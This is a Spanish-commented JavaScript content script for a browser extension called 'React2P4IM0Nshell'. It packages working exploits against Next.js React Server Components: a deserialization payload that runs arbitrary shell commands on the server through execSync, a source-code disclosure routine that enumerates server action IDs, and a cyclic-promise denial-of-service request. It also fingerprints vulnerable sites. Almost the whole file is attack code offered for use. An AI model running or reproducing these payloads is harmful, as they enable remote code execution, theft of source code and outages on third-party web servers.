/**
 * React2P4IM0Nshell - Script de Inyección del Núcleo v3.7
 * Framework Version: 3.7 (Soporte Multi-CVE: RCE, Leak, DoS)
 */

(function() {
    // === PROTECCIÓN CONTRA INYECCIÓN DOBLE ===
    if (window.P4IM0N_LOADED) {
        console.log("%c[!] P4IM0N SHELL YA ESTÁ ACTIVA", "color: orange");
        return;
    }
    window.P4IM0N_LOADED = true;

    // LOG DE INICIO
    console.log("%c[+] P4IM0N SHELL INYECTADA Y LISTA", "background: #000; color: #00ff41; font-size: 16px; font-weight: bold; padding: 4px;");

    // === BASE DE DATOS DE EXPLOITS ===
    const BASE_DE_DATOS_EXPLOITS = {
        // [POC ORIGINAL] - CVE-2025-55182 (RCE)
        "CVE-2025-55182": {
            nombre: "Next.js RSC Deserialization (RCE)",
            ejecutar: async (comandoUsuario) => {
                const comandoObjetivo = comandoUsuario || "echo P4IM0N_RCE_TEST";
                const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${comandoObjetivo}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
                const limite = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
                const partesCuerpo = [
                    `--${limite}`,
                    'Content-Disposition: form-data; name="0"',
                    '',
                    payloadJson,
                    `--${limite}`,
                    'Content-Disposition: form-data; name="1"',
                    '',
                    '"$@0"',
                    `--${limite}`,
                    'Content-Disposition: form-data; name="2"',
                    '',
                    '[]',
                    `--${limite}--`,
                    ''
                ].join('\r\n');

                const urlObjetivo = window.location.pathname === "/" ? "/adfa" : window.location.pathname + "/adfa";

                try {
                    const res = await fetch(urlObjetivo, {
                        method: 'POST',
                        headers: {
                            'Next-Action': 'x',
                            'X-Nextjs-Request-Id': '7a3f9c1e',
                            'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',
                            'Content-Type': `multipart/form-data; boundary=${limite}`,
                            'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
                        },
                        body: partesCuerpo
                    });

                    const textoRespuesta = await res.text();
                    const coincidenciaDigest = textoRespuesta.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

                    if (coincidenciaDigest && coincidenciaDigest[1]) {
                        let base64Crudo = coincidenciaDigest[1];
                        try {
                            let base64Limpio = JSON.parse(`"${base64Crudo}"`);
                            const cadenaDecodificada = new TextDecoder().decode(
                                Uint8Array.from(atob(base64Limpio), c => c.charCodeAt(0))
                            );
                            return { exito: true, salida: cadenaDecodificada };
                        } catch (errorParseo) {
                            return { exito: false, msg: "Error de Decodificación", debug: base64Crudo };
                        }
                    } else {
                        return { exito: false, msg: "Exploit Fallido: Digest no encontrado", debug: textoRespuesta.substring(0, 100) };
                    }
                } catch (e) {
                    return { exito: false, msg: "Error de Red: " + e.message };
                }
            }
        },

        // [INTEGRACIÓN] - CVE-2025-55183 (SOURCE CODE DISCLOSURE)
        "CVE-2025-55183": {
            nombre: "Next.js RSC Source Code Disclosure",
            ejecutar: async () => {
                const scripts = Array.from(document.querySelectorAll('script[src*="/_next/static/chunks/"]'));
                const chunkUrls = scripts.map(s => s.src);
                
                if (chunkUrls.length === 0) {
                    return { exito: false, msg: "No se encontraron chunks JS de Next.js en el DOM." };
                }

                let actionIds = new Set();
                let logProgreso = `[+] Analizando ${chunkUrls.length} archivos JS...\n`;
                
                for (const url of chunkUrls) {
                    try {
                        const res = await fetch(url);
                        const text = await res.text();
                        const matches = text.matchAll(/"([a-f0-9]{40,42})"/g);
                        for (const match of matches) {
                            actionIds.add(match[1]);
                        }
                    } catch(e) {}
                }
                
                if (actionIds.size === 0) {
                    return { exito: false, msg: "No se encontraron Action IDs en los chunks." };
                }

                logProgreso += `[+] IDs encontrados: ${actionIds.size}. Iniciando explotación...\n`;

                const boundary = "----SourceLeak";
                
                for (const id of actionIds) {
                    const body = [
                       `--${boundary}`,
                       'Content-Disposition: form-data; name="0"',
                       '',
                       '["$F1"]',
                       `--${boundary}`,
                       'Content-Disposition: form-data; name="1"',
                       '',
                       `{"id":"${id}","bound":null}`,
                       `--${boundary}--`,
                       ''
                    ].join('\r\n');
                    
                    try {
                        const res = await fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Next-Action': id,
                                'Content-Type': `multipart/form-data; boundary=${boundary}`
                            },
                            body: body
                        });
                        
                        const text = await res.text();
                        
                        if (text.includes("function") && !text.includes("function () { [omitted code] }")) {
                            const leakMatch = text.match(/function\s+[a-zA-Z0-9_$]+\s*\([^)]*\)\s*{[\s\S]*?}/);
                            
                            if (leakMatch || text.length > 50) {
                                const codigoFiltrado = leakMatch ? leakMatch[0] : text.substring(0, 800) + "...";
                                return { 
                                    exito: true, 
                                    salida: `${logProgreso}[!] ¡CÓDIGO FUENTE FILTRADO!\nID Vulnerable: ${id}\n\n${codigoFiltrado}` 
                                };
                            }
                        }
                    } catch(e) {}
                }
                
                return { exito: false, msg: `Se probaron ${actionIds.size} IDs pero ninguno retornó código fuente visible.` };
            }
        },

        // [NUEVO INTEGRACIÓN] - CVE-2025-55184 (DOS)
        "CVE-2025-55184": {
            nombre: "Next.js RSC Cyclic Promise DoS",
            ejecutar: async () => {
                // Payload Cíclico: El objeto 0 referencia al 1, y el 1 referencia al 0.
                // Esto causa un bucle infinito en el procesador de Flight si no está parcheado.
                const boundary = "----CyclicDoS" + Date.now();
                const body = [
                   `--${boundary}`,
                   'Content-Disposition: form-data; name="0"',
                   '',
                   '"$@1"',
                   `--${boundary}`,
                   'Content-Disposition: form-data; name="1"',
                   '',
                   '"$@0"',
                   `--${boundary}--`,
                   ''
                ].join('\r\n');

                const target = window.location.href;
                const timeoutMs = 5000; // 5 segundos para determinar si se colgó
                
                // Usamos AbortController para matar la petición si tarda demasiado (Símbolo de éxito del DoS)
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
                
                try {
                    const startTime = Date.now();
                    const res = await fetch(target, {
                        method: 'POST',
                        headers: {
                            'Next-Action': 'x', // Activador genérico
                            'Content-Type': `multipart/form-data; boundary=${boundary}`
                        },
                        body: body,
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeoutId);
                    
                    // Si llegamos aquí, el servidor respondió.
                    const duration = Date.now() - startTime;
                    return { 
                        exito: false, 
                        msg: `El servidor respondió en ${duration}ms.\nEstado: ${res.status}\nConclusión: Probablemente NO vulnerable (Parcheado).` 
                    };
                    
                } catch (e) {
                    if (e.name === 'AbortError') {
                        // El timeout saltó, lo que significa que el servidor se quedó pensando infinitamente
                        return { 
                            exito: true, 
                            salida: `[!] VULNERABILIDAD CONFIRMADA (DoS Exitoso)\n\nEl servidor NO respondió después de ${timeoutMs}ms al recibir el payload cíclico.\nEsto indica que el proceso del servidor entró en un bucle infinito y dejó de responder.\n\nPayload Enviado:\n--${boundary}\nContent-Disposition: form-data; name="0"\n"$@1"\n...` 
                        };
                    }
                    return { exito: false, msg: "Error de red inesperado: " + e.message };
                }
            }
        }
    };

    // === MÓDULOS DE ESCANEO ===
    function ejecutarEscaneoPasivo() {
        let puntuacion = 0;
        let detalles = [];
        const html = document.documentElement.outerHTML;

        if (document.contentType === "text/x-component") {
            puntuacion += 100;
            detalles.push("[+] Content-Type detectado: text/x-component");
        }
        if (/(window|self)\.__next_f\s*=/.test(html)) {
            puntuacion += 80;
            detalles.push("[+] Detectado: window.__next_f (App Router)");
        }
        if (html.includes("react-server-dom-webpack")) {
            puntuacion += 30;
            detalles.push("[+] Detectado: react-server-dom-webpack");
        }
        return { esRSC: puntuacion >= 50, detalles: detalles };
    }

    async function ejecutarHuella() {
        try {
            console.log("[P4IM0N] Enviando sonda activa...");
            const res = await fetch(window.location.href, {
                method: 'GET',
                headers: { 'RSC': '1' }
            });
            
            let detalles = [];
            const tipoContenido = res.headers.get('Content-Type') || "";
            const cabeceraVary = res.headers.get('Vary') || "";
            const textoCuerpo = await res.text();

            if (tipoContenido.includes('text/x-component')) detalles.push("[!] La respuesta cambió a text/x-component");
            if (cabeceraVary.includes('RSC')) detalles.push("[!] Cabecera Vary filtró 'RSC'");
            if (/^\d+:["IHL]/.test(textoCuerpo)) detalles.push("[!] El cuerpo coincide con Protocolo React Flight");

            return { detectado: detalles.length > 0, detalles: detalles };
        } catch (e) {
            console.error("[P4IM0N] Error en sonda:", e);
            return { detectado: false, detalles: ["Fallo de Conexión"] };
        }
    }

    // === INICIALIZACIÓN Y LISTENER ===
    
    // Ejecutar escaneo inicial inmediatamente
    const datosPasivos = ejecutarEscaneoPasivo();
    if(datosPasivos.esRSC) {
        console.log("[P4IM0N] Objetivo Vulnerable Detectado.");
        chrome.runtime.sendMessage({ accion: "actualizar_insignia" }).catch(() => {});
    }

    chrome.runtime.onMessage.addListener((solicitud, emisor, enviarRespuesta) => {
        // Log para depuración
        console.log("[P4IM0N] Comando recibido:", solicitud.accion);

        switch(solicitud.accion) {
            case "obtener_pasivo":
                enviarRespuesta(datosPasivos);
                break;
            
            case "ejecutar_huella":
                ejecutarHuella().then(res => enviarRespuesta(res));
                return true; 

            case "ejecutar_exploit":
                const moduloExploit = BASE_DE_DATOS_EXPLOITS[solicitud.tipo];
                if (moduloExploit) {
                    moduloExploit.ejecutar(solicitud.cmd).then(res => enviarRespuesta(res));
                } else {
                    enviarRespuesta({ exito: false, msg: "Módulo no encontrado" });
                }
                return true; 
            
            default:
                enviarRespuesta({ error: "Accion desconocida" });
        }
    });

})();